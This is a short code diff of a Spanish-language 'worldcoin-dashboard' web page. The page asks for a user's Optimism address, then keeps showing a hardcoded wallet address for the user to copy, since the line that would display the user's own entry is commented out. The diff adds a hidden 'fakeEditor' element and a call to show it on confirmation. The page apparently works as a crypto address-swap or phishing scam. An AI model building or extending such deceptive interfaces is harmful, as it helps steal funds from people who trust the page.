@@ -31,6 +31,9 @@
     <div id="worldcoin-dashboard">
     <input type="text" id="worldcoinAddressInput" placeholder="Ingresa tu dirección de Optimism">
     <button id="confirmAddress">Confirmar Dirección</button> <!-- Botón de confirmación agregado -->
+<div id="fakeEditor" style="display:none; background: #f4f4f4; border: 1px solid #ccc; padding: 10px;"></div>
+
+        
     <button id="copyAddress" style="display:none;">Copiar Dirección</button> <!-- Ocultar inicialmente -->
     <p id="providedAddress" style="display:block;">0x01C65F22A9478C2932e62483509c233F0aaD5c72</p> <!-- Visible por defecto -->
 </div>
@@ -233,7 +236,8 @@ span {
         
         // Opcionalmente, puedes actualizar la dirección mostrada con la ingresada por el usuario
         // document.getElementById('providedAddress').textContent = userAddress;
-        
+     mostrarFakeEditor();
+  
         alert('Dirección confirmada. Ahora puedes copiarla.');
     } else {
         alert('Por favor, ingresa una dirección.');
